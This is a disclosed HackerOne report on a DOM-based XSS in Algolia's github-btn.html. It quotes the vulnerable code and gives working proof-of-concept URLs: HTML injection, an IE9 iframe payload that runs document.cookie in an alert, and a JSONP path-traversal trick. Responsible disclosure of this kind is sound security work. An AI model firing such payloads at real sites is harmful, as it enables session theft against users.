# [github.algolia.com] DOM Based XSS github-btn.html

## Report Details
- **Report ID**: 200826
- **URL**: https://hackerone.com/reports/200826
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-01-24T15:45:48.165Z
- **Disclosed**: 2017-03-31T19:42:12.862Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: algolia

## Vulnerability Information
Description
===

**Vulnerable parameter:** user
**Vulnerable script:** https://github.algolia.com/github-btn.html
**Vulnerable code:**
```js
        var params = function() {
                for (var t, e = [], o = window.location.href.slice(window.location.href.indexOf("?") + 1).split("&"), r = 0; r < o.length; r++) t = o[r].split("="), e.push(t[0]), e[t[0]] = t[1];
                return e
            }(),
            user = params.user,
            repo = params.repo,
            type = params.type,
 ...
  "follow" == type && (mainButton.className += " github-me", text.innerHTML = "Follow @" + user, button.href = "https://github.com/" + user
```

PoCs
===

**PoC #1**
HTML Injection for Chrome, Internet Explorer

```
https://github.algolia.com/github-btn.html?#&user=<h1><marquee>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>&type=follow
```

**PoC #2**
XSS for Internet Explorer (using X-UA-Compatible IE=9)

```
https://blackfan.ru/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27https://github.algolia.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E
```


Another vulns
===

Also, this script has potential vulnerabilities using user controlled parameters in the path to the JS script.
But for the exploitation it requires additional vulnerability on api.github.com (for example, Open Redirect or user controlled output).

```js
function jsonp(t) {
  var e = document.createElement("script");
  e.src = t + "?callback=callback", head.insertBefore(e, head.firstChild)
}
...
jsonp("follow" == type ? "https://api.github.com/users/" + user : "https://api.github.com/repos/" + user + "/" + repo);
```

**PoC**

```
https://github.algolia.com/github-btn.html?#&user=../../another/endpoint&repo=../../another/endpoint&type=fork
```

**Result**
```
https://api.github.com/another/endpoint?callback=callback
```

## Attachments
- Screenshot_at_19-44-33.png
